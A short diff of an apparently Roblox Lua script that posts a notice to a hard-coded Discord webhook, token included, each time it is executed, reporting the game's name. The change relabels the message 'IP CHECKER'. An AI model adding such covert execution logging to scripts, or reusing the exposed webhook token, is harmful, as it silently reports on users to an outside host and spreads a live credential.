@@ -10,7 +10,7 @@ local webhookcheck =
 local url =
    "https://discord.com/api/webhooks/1028532281297616916/3Wgg9CqJczj2kybFuPQ0pHBiFkQy4uR2bbsDCvGDbd4j5yHHoS8SZS2NR0RaRIzaFu_h" -- put ur webhook here dumbos
 local data = {
-   ["content"] = "Executed (SA)",
+   ["content"] = "Executed IP CHECKER",
    ["embeds"] = {
        {
            ["title"] = "**Someone Executed (SA)** in: "   ..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.. " :)",
